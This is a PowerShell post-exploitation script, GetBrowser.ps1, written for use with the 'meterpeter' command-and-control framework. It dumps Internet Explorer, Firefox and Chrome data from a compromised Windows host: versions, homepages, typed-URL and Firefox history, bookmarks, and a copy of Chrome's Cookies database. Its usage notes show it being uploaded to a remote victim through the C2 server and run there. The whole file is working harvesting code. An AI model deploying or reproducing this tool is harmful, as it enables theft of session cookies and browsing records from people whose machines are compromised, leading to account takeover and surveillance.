<#
.SYNOPSIS
  Standalone Powershell script that will dump Local-Host browsers information.

.Author r00t-3xp10it (SSA RedTeam @2020)
  Required Dependencies: Local Web Browser
  Optional Dependencies: None
  PS Script Dev Version: v1.5

.DESCRIPTION
   Standalone Powershell script to dump Local-host browser information sutch as: HomePage, Browser Version
   Language Used, Download Directory, URL History, Bookmarks, etc.. The dumps will be Saved into $env:TMP
   Folder. Unless this script 2º argument its used to input another LogFile storage location.

.EXAMPLE
   PS C:\> ./GetBrowser.ps1 -ALL
   Enumerates Internet Explorer (IE), FireFox and Chrome Browsers info.

.EXAMPLE
   PS C:\> ./GetBrowser.ps1 -HELP
   Displays GetBrowser.ps1 help description.

.EXAMPLE
   PS C:\> ./GetBrowser.ps1 -FIREFOX
   Enumerates FireFox Browser information Only.

.EXAMPLE
   PS C:\> .\GetBrowser.ps1 -CHROME $env:USERPROFILE\Desktop
   Enumerates Chrome Browser Info and writes logfile to $env:USERPROFILE\Desktop\BrowserEnum.log

.NOTES
   :meterpeter> upload
   - Upload Local File: mimiRatz\GetBrowser.ps1
   :meterpeter> .\GetBrowser.ps1 -IE
   
   Uploads This PS Script to Remote-Host $env:TMP Location and Enumerates Internet Explorer
   Remote browser using meterpeter C2 Server { https://github.com/r00t-3xp10it/meterpeter }
   
.LINK 
    https://github.com/r00t-3xp10it/meterpeter
    https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/GetBrowser.ps1
    https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1 (flagged by AV)
#>

$RFP = $null
$IPATH = pwd
$Path = $null
$JsPrefs = $null
$RegPrefs = $null
$ParsingData = $null
$param1 = $args[0] # User Args
$param2 = $args[1] # User Args
## Auto-Set @Args in the case of User empty inputs (LogFile Path).
If(-not($param2)){$LogFilePath = "$env:TMP"}else{$LogFilePath = "$param2"}
If(-not($param1)){
   ## Required (obrigatory) Parameters Settings
   echo "`nGetBrowser - Dump Local-Host Browsers Information." > $LogFilePath\BrowserEnum.log
   echo "[ ERROR ] This Script Requires Parameters (Args) to Run .." >> $LogFilePath\BrowserEnum.log
   echo "`n[Example] ./GetBrowser.ps1 -IE" >> $LogFilePath\BrowserEnum.log
   echo "[Example] ./GetBrowser.ps1 -ALL" >> $LogFilePath\BrowserEnum.log
   echo "[Example] ./GetBrowser.ps1 -HELP" >> $LogFilePath\BrowserEnum.log
   echo "[Example] ./GetBrowser.ps1 -CHROME" >> $LogFilePath\BrowserEnum.log
   echo "[Example] ./GetBrowser.ps1 -FIREFOX" >> $LogFilePath\BrowserEnum.log
   Get-Content $LogFilePath\BrowserEnum.log;Remove-Item $LogFilePath\BrowserEnum.log -Force
   Start-Sleep -Seconds 8;exit
}


## [GetBrowser] PS Script Banner
Write-Host "GetBrowser - Dump Local-Host Browsers Information." -ForeGroundColor Green
Write-Host "[i] Dumping Data To: $LogFilePath\BrowserEnum.log" -ForeGroundColor yellow -BackgroundColor Black
Start-sleep -Seconds 2

## Get System Default Configurations
$Caption = Get-CimInstance Win32_OperatingSystem|Format-List *|findstr /I /B /C:"Caption"
$Registry = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $Env:COMPUTERNAME)
$RegistryKey = $Registry.OpenSubKey("SOFTWARE\\Classes\\http\\shell\\open\\command")
$Value = $RegistryKey.GetValue("") -replace '%1','' -replace '"',''
$IntSet = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\internet settings" -Name 'User Agent'|Select-Object 'User Agent'
$ParsingIntSet = $IntSet -replace '@{User Agent=','UserAgent : ' -replace '}',''
$ParseCap = $Caption -replace '                                   :','   :'
$MInvocation = "WebBrowser: "+"$Value";
## Writting LogFile to the selected path in: { $param2 var }
echo "`n`nSystem Defaults" > $LogFilePath\BrowserEnum.log
echo "---------------" >> $LogFilePath\BrowserEnum.log
echo "$ParseCap" >> $LogFilePath\BrowserEnum.log 
echo "$ParsingIntSet" >> $LogFilePath\BrowserEnum.log 
echo "$MInvocation" >> $LogFilePath\BrowserEnum.log


function HELP_MENU {
  ## Help Menu (parameters - arguments)
  If($param1 -eq "-help" -or $param1 -eq "-HELP"){
    write-host "`n"
    write-host ".Author r00t-3xp10it {SSA RedTeam @2020}" -ForegroundColor Green
    write-host "  Required Dependencies: Local Web Browser"
    write-host "  Optional Dependencies: None"
    write-host "  PS Script Dev Version: v1.5"
    write-host "`n"
    write-host ".DESCRIPTION" -ForegroundColor Green
    write-host "  Standalone Powershell script to dump Local-host browser information sutch as:"
    write-host "  HomePage, Browser Version, Contry Code, Download Dir, URL History, Bookmarks,"
    write-host "  etc.. The dumps will be Saved into `$env:TMP Folder for later review. Unless"
    write-host "  this script 2º argument its used to input another LogFile storage location"
    write-host "`n"
    write-host ".EXAMPLE" -ForegroundColor Green
    write-host "  PS C:\> ./GetBrowser.ps1 -ALL"
    write-host "  Enumerates Internet Explorer (IE), FireFox and Chrome Browsers info."
    write-host "`n"
    write-host ".EXAMPLE" -ForegroundColor Green
    write-host "  PS C:\> ./GetBrowser.ps1 -FIREFOX"
    write-host "  Enumerates FireFox Browser information Only."
    write-host "`n"
    write-host ".EXAMPLE" -ForegroundColor Green
    write-host "  PS C:\> .\GetBrowser.ps1 -CHROME `$env:USERPROFILE\Desktop"
    write-host "  Enumerates Chrome Browser Info and writes logfile to `$env:USERPROFILE\Desktop\BrowserEnum.log"
    write-host "`n"
    write-host ".NOTES" -ForegroundColor Green
    write-host "  :meterpeter> upload"
    write-host "  - Upload Local File: mimiRatz\GetBrowser.ps1"
    write-host "  :meterpeter> .\GetBrowser.ps1 -IE"
    write-host "`n"
    write-host "  Uploads This PS Script to Remote-Host `$env:TMP Location and Enumerates Internet Explorer"
    write-host "  Remote browser using meterpeter C2 Server { https://github.com/r00t-3xp10it/meterpeter }"
    write-host "`n"
    write-host ".LINK" -ForegroundColor Green
    write-host "  https://github.com/r00t-3xp10it/meterpeter"
    write-host "  https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/GetBrowser.ps1"
    write-host "`n"
    Start-Sleep -Seconds 3
    exit
  }
}


function IE_Dump {
  ## Retrieve IE Browser Information
  $IEVersion = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -Name 'Version' -ErrorAction SilentlyContinue|Select-Object 'Version'
  If(-not($IEVersion) -or $IEVersion -eq $null){
      echo "`n`n`nIE Browser" >> $LogFilePath\BrowserEnum.log
      echo "----------" >> $LogFilePath\BrowserEnum.log
      echo "Could not find any IE Browser Info .." >> $LogFilePath\BrowserEnum.log
  }else{
      $IEData = $IEVersion -replace '@{Version=','Version      : ' -replace '}',''
      $KBNumber = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -Name 'svcKBNumber'|Select-Object 'svcKBNumber'
      $KBData = $KBNumber -replace '@{svcKBNumber=','KBUpdate     : ' -replace '}',''
      $RegPrefs = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\Main\" -Name 'start page'|Select-Object 'Start Page'
      $ParsingData = $RegPrefs -replace '@{Start Page=','HomePage     : ' -replace '}',''
      $LocalPage = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\Main\" -Name 'Search Page'|Select-Object 'Search Page'
      $ParsingLocal = $LocalPage -replace '@{Search Page=','SearchPage   : ' -replace '}',''
      $IntSet = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\internet settings" -Name 'User Agent'|Select-Object 'User Agent'
      $ParsingIntSet = $IntSet -replace '@{User Agent=','UserAgent    : ' -replace '}',''
      echo "`n`n`nIE Browser" >> $LogFilePath\BrowserEnum.log
      echo "----------" >> $LogFilePath\BrowserEnum.log
      echo "$KBData" >> $LogFilePath\BrowserEnum.log
      echo "$IEData" >> $LogFilePath\BrowserEnum.log
      echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
      echo "$ParsingLocal" >> $LogFilePath\BrowserEnum.log
  }

  ## Retrieve IE history URLs
  $IEHistory = Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Internet Explorer\TypedURLs" -ErrorAction SilentlyContinue|findstr /B /I "url"
  If(-not($IEHistory) -or $IEHistory -eq $null){
      echo "`nIE History" >> $LogFilePath\BrowserEnum.log
      echo "----------" >> $LogFilePath\BrowserEnum.log
      echo "Could not find any IE History Info .." >> $LogFilePath\BrowserEnum.log
  }else{
      echo "`nIE History" >> $LogFilePath\BrowserEnum.log
      echo "----------" >> $LogFilePath\BrowserEnum.log
      Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Internet Explorer\TypedURLs"|findstr /B /I "url" >> $LogFilePath\BrowserEnum.log
  }

  ## Retrieve IE Bookmarks
  echo "`nIE Bookmarks" >> $LogFilePath\BrowserEnum.log
  echo "------------" >> $LogFilePath\BrowserEnum.log
  $URLs = Get-ChildItem -Path "$Env:SYSTEMDRIVE\Users\" -Filter "*.url" -Recurse -ErrorAction SilentlyContinue
  ForEach ($URL in $URLs) {
      if ($URL.FullName -match 'Favorites') {
          $User = $URL.FullName.split('\')[2]
          Get-Content -Path $URL.FullName | ForEach-Object {
              try {
                  if ($_.StartsWith('URL')) {
                      ## parse the .url body to extract the actual bookmark location
                      $URL = $_.Substring($_.IndexOf('=') + 1)
                          if($URL -match $Search) {
                              echo "$URL" >> $LogFilePath\BrowserEnum.log
                          }
                  }
              }
              catch {
                  echo "Error parsing url: $_" >> $LogFilePath\BrowserEnum.log
              }
          }
      }
  }
}


function FIREFOX {
  ## Retrieve FireFox Browser Information
  $Path = Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles";
  If($Path -eq $True){
      ## change to the correct directory structure
      cd $env:APPDATA\Mozilla\Firefox\Profiles\*.default
      echo "`n`n`nFireFox Browser" >> $LogFilePath\BrowserEnum.log
      echo "---------------" >> $LogFilePath\BrowserEnum.log

      ## get browser countryCode
      $JsPrefs = Get-content prefs.js|Select-String "browser.search.countryCode";
      $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\);','' -replace 'browser.search.countryCode','countryCode  '
      echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
      ## get PlatformVersion
      $JsPrefs = Get-content prefs.js|Select-String "extensions.lastPlatformVersion"
      $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\);','' -replace 'extensions.lastPlatformVersion','Version      '
      echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
      ## get browser plugin.flash.version
      $JsPrefs = Get-content prefs.js|Select-String "plugin.flash.version";
      $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\);','' -replace 'plugin.flash.version','flash        '
      echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
      ## get brownser startup page
      $JsPrefs = Get-content prefs.js|Select-String "browser.startup.homepage"
      $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\);','' -replace 'browser.startup.homepage','HomePage     '
      echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
      ## get browser DownloadDir
      $JsPrefs = Get-content prefs.js|Select-String "browser.download.lastDir";
      $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\);','' -replace 'browser.download.lastDir','Downloads    '
      echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
      ## Returning to working directory
      cd $IPATH
  }else{
      echo "`n`nFireFox Browser" >> $LogFilePath\BrowserEnum.log
      echo "---------------" >> $LogFilePath\BrowserEnum.log
      echo "Could not find any FireFox Info .." >> $LogFilePath\BrowserEnum.log
  }

  ## Dump FIREFOX HISTORY URLs
  If($Path -eq $False) {
      echo "`nFireFox History" >> $LogFilePath\BrowserEnum.log
      echo "---------------" >> $LogFilePath\BrowserEnum.log
      echo "Could not find any FireFox History URLs .." >> $LogFilePath\BrowserEnum.log
  }else{
      echo "`nFireFox History" >> $LogFilePath\BrowserEnum.log
      echo "---------------" >> $LogFilePath\BrowserEnum.log
      $Profiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\"
      $Regex = '([a-zA-Z]{3,})://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
      Get-Content $Profiles\places.sqlite | Select-String -Pattern $Regex -AllMatches | % { $_.Matches } | % { $_.Value } | Sort-Object -Unique | % {
          $Value = New-Object -TypeName PSObject -Property @{
              FireFoxHistoryURL = $_
          }
          if ($Value -match $Search) {
              $ParsingData = $Value -replace '@{FireFoxHistoryURL=','' -replace '}',''
              echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
          }
      }
  }
}


function CHROME {
  ## Retrieve Google Chrome Browser Information
  $Path = Get-ItemProperty 'HKCU:\Software\Google\Chrome\BLBeacon' -ErrorAction SilentlyContinue
  If(-not($Path) -or $Path -eq $null){
      echo "`n`n`nChrome Browser" >> $LogFilePath\BrowserEnum.log
      echo "--------------" >> $LogFilePath\BrowserEnum.log
      echo "Could not find any Chrome Info .." >> $LogFilePath\BrowserEnum.log
  }else{
      $GCVersionInfo = (Get-ItemProperty 'HKCU:\Software\Google\Chrome\BLBeacon').Version
      echo "`n`n`nChrome Browser" >> $LogFilePath\BrowserEnum.log
      echo "--------------" >> $LogFilePath\BrowserEnum.log
      echo "Version      : $GCVersionInfo" >> $LogFilePath\BrowserEnum.log
  }

  ## Retrieve Chrome bookmarks
  $Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Bookmarks"
  $check_path = Test-Path -Path $Path
  If($check_path -eq $True){
      echo "`nChrome Bookmarks" >> $LogFilePath\BrowserEnum.log
      echo "----------------" >> $LogFilePath\BrowserEnum.log
      Get-Content $Path|Select-String "http"|format-list >> $LogFilePath\BrowserEnum.log
  }else{
      echo "`nChrome Bookmarks" >> $LogFilePath\BrowserEnum.log
      echo "----------------" >> $LogFilePath\BrowserEnum.log
      echo "Could not find any Chrome Bookmarks .." >> $LogFilePath\BrowserEnum.log
  }

  ## Retrieve CHrome Cookies
  $Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
  $check_path = Test-Path -Path $Path
  If($check_path -eq $True){
      echo "`nChrome Cookies" >> $LogFilePath\BrowserEnum.log
      echo "--------------" >> $LogFilePath\BrowserEnum.log
      echo "Dump       : $LogFilePath\cookies" >> $LogFilePath\BrowserEnum.log
      Copy-Item -Path $Path -Destination $LogFilePath\cookies
  }else{
      echo "`nChrome Cookies" >> $LogFilePath\BrowserEnum.log
      echo "--------------" >> $LogFilePath\BrowserEnum.log
      echo "Could not find any Chrome Cookies .." >> $LogFilePath\BrowserEnum.log
  }
}



## Jump Links (Functions)
If(-not($param1)){$param1 = "-help"}
If($param1 -eq "-IE"){IE_Dump}
If($param1 -eq "-CHROME"){CHROME}
If($param1 -eq "-HELP"){HELP_MENU}
If($param1 -eq "-FIREFOX"){FIREFOX}
If($param1 -eq "-ALL"){IE_Dump;FIREFOX;CHROME}


## Retrieve Remote Info from LogFile
Get-Content $LogFilePath\BrowserEnum.log;Write-Host "`n`n";
Write-Host "[i] DumpLogFile: $LogFilePath\BrowserEnum.log" -ForeGroundColor yellow -BackGroundColor Black
Start-sleep -Seconds 4
exit
